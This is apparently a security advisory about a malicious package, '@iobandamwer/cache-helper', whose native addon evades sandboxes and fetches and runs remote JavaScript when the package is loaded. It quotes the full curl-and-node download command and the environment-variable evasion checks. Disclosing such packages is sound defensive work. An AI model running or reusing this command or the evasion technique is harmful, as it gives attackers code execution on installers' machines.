summary: @iobandamwer/cache-helper ships a native-addon dropper that fetches and executes remote JavaScript on require()
details: The package presents itself as a cache helper but contains no cache logic. index.js consists of a single try/catch that calls require('./addon.node').init() on module load. The shipped ELF native addon, when neither GITHUB_ACTIONS nor SANDBOX environment variables are set, forks a detached child via setsid and runs `curl -sL 'https://raw.githubusercontent.com/CementBeetleSteeple/node-cache-utils/main/loader.js' -o /tmp/.hc && node /tmp/.hc`, executing attacker-controlled JavaScript from a mutable branch on an unrelated personal GitHub repository. The payload is concealed inside a precompiled binary to evade JavaScript-level inspection, and the sandbox-environment guards indicate deliberate detection evasion. Any require() of this package yields full remote code execution on the installer's machine under the installer's user.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
